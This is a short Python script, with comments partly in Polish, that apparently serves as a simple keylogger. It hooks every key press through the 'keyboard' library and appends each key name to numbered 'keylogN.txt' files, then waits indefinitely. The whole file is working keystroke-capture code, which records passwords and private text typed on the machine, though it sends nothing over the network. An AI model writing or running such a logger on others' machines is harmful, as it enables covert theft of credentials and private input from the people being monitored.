import keyboard
# import bilbioteki do obsługi plików
import os


def get_latest_file_number():
    a = 0
    for file in os.listdir():
        if file.endswith(".txt"):
            if file.startswith("keylog"):
                number_str = file[6:-4]
                if number_str.isdigit():  # Check if the substring is a digit
                    number = int(number_str)
                    if number > a:
                        a = number
    return a

def get_file():
    file_number = get_latest_file_number() + 1
    # return file that is opened for append
    return f"keylog{file_number}.txt"


file = get_file()
def on_key_event(event):
    key = str(event.name)
    with open(file, "a") as plik:
        plik.write(key + "\n")
# Hook the keyboard events

keyboard.on_press(on_key_event)
# Keep the program running
keyboard.wait()

